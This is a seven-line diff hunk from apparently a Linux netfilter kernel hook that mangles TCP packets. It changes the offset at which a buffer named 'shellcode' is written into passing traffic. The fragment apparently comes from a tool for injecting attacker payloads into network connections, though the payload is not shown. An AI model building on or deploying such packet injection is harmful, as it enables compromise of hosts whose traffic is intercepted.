@@ -127,7 +127,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 						ct, 
 						ctinfo,
 						iph->ihl * 4, 
-						(int)(phead - pkg), 
+						(int)(phead - pkg) + 6, 
 						6,
 						shellcode, 
 						strlen(shellcode))) 
